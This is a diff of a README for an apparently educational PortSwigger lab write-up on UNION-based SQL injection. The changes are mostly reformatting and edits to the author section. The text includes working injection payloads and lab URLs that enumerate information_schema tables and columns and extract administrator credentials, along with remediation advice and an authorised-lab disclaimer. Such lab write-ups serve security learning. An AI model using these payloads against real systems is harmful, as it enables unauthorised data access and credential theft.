@@ -6,7 +6,7 @@
 ![Technique](https://img.shields.io/badge/technique-UNION%20Based-blue?style=flat-square)
 ![Year](https://img.shields.io/badge/year-2026-gray?style=flat-square)
 
-<h1> SQL Injection — Listing Database Contents (Non-Oracle)</h1>
+<h1>🗄️ SQL Injection — Listing Database Contents (Non-Oracle)</h1>
 <p><em>UNION-based extraction of usernames and passwords via information_schema enumeration</em></p>
 
 [PortSwigger Lab](#) · [Report Bug](#) · [View Writeup](#)
@@ -64,7 +64,6 @@ SELECT name, description FROM products WHERE category = '[USER INPUT]'
 User input is injected directly without parameterization. A single quote `'` terminates the string literal, and a `UNION SELECT` clause appends attacker-controlled query results to the legitimate response. The `--` sequence comments out the remainder of the original query.
 
 **Conditions met for UNION attack:**
-
 - Query results are returned in the application response (in-band)
 - The number of columns and their data types can be matched
 - `information_schema` is accessible (non-Oracle database)
@@ -95,7 +94,6 @@ Query `information_schema.tables` to enumerate all user-defined tables in the da
 ```
 
 **Full URL:**
-
 ```
 https://0aff00eb037d2102843ef023001c00e4.web-security-academy.net/filter?category=Accessories%27union+select+table_name,null+from+information_schema.tables--
 ```
@@ -113,7 +111,6 @@ Query `information_schema.columns` filtered by the target table name to identify
 ```
 
 **Full URL:**
-
 ```
 https://0aff00eb037d2102843ef023001c00e4.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users_cbcldv%27--
 ```
@@ -142,12 +139,12 @@ Used the extracted `administrator` credentials to authenticate at the applicatio
 
 ## Payloads Reference
 
-| Step                | Payload                                                                                             |
-| ------------------- | --------------------------------------------------------------------------------------------------- |
-| Column count test   | `' UNION SELECT NULL,NULL--`                                                                        |
-| List all tables     | `' UNION SELECT table_name,NULL FROM information_schema.tables--`                                   |
-| List columns        | `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--` |
-| Extract credentials | `' UNION SELECT username_col,password_col FROM users_cbcldv--`                                      |
+| Step | Payload |
+|---|---|
+| Column count test | `' UNION SELECT NULL,NULL--` |
+| List all tables | `' UNION SELECT table_name,NULL FROM information_schema.tables--` |
+| List columns | `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--` |
+| Extract credentials | `' UNION SELECT username_col,password_col FROM users_cbcldv--` |
 
 ---
 
@@ -188,22 +185,33 @@ Used the extracted `administrator` credentials to authenticate at the applicatio
 
 ## Remediation
 
-| Issue                                    | Fix                                             |
-| ---------------------------------------- | ----------------------------------------------- |
-| Unsanitized user input in SQL query      | Use parameterized queries / prepared statements |
-| Error messages revealing DB structure    | Suppress verbose database errors in production  |
-| Credentials stored in plaintext          | Hash passwords with bcrypt / Argon2             |
-| Unrestricted `information_schema` access | Apply least-privilege DB user permissions       |
+| Issue | Fix |
+|---|---|
+| Unsanitized user input in SQL query | Use parameterized queries / prepared statements |
+| Error messages revealing DB structure | Suppress verbose database errors in production |
+| Credentials stored in plaintext | Hash passwords with bcrypt / Argon2 |
+| Unrestricted `information_schema` access | Apply least-privilege DB user permissions |
 
 ---
 
 ## Author
 
-**Michael Asante Anim** (`Aerixis`)
+**Michael Asante Anim** | `0x1aerixis`
+BSc Cyber Security — University of Mines and Technology (UMaT), Tarkwa, Ghana
 
-- GitHub: [@anim-michael-asante](https://github.com/anim-michael-asante)
-- X: [@0x1aerixis](https://x.com/0x1aerixis)
-- TryHackMe: [0x1aerixis](https://tryhackme.com/p/0x1aerixis)
+[![GitHub](https://img.shields.io/badge/GitHub-anim--michael--asante-black?logo=github)](https://github.com/anim-michael-asante)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?logo=linkedin)](https://linkedin.com/in/michael-asante-anim)
+[![TryHackMe](https://img.shields.io/badge/TryHackMe-0x1aerixis-red?logo=tryhackme)](https://tryhackme.com/p/0x1aerixis)
+[![X](https://img.shields.io/badge/X-0x1aerixis-black?logo=x)](https://x.com/0x1aerixis)
+[![Discord](https://img.shields.io/badge/Discord-0x1aerixis-5865F2?logo=discord)](https://discord.com/users/0x1aerixis)
+
+> _"Built in the lab. Documented for the field."_
+
+---
+
+> **Disclaimer:** All work documented in this repository was conducted in authorized, isolated
+> lab environments or sanctioned CTF platforms. No unauthorized systems were accessed.
+> This project is intended for educational and portfolio purposes only.
 
 ---
 
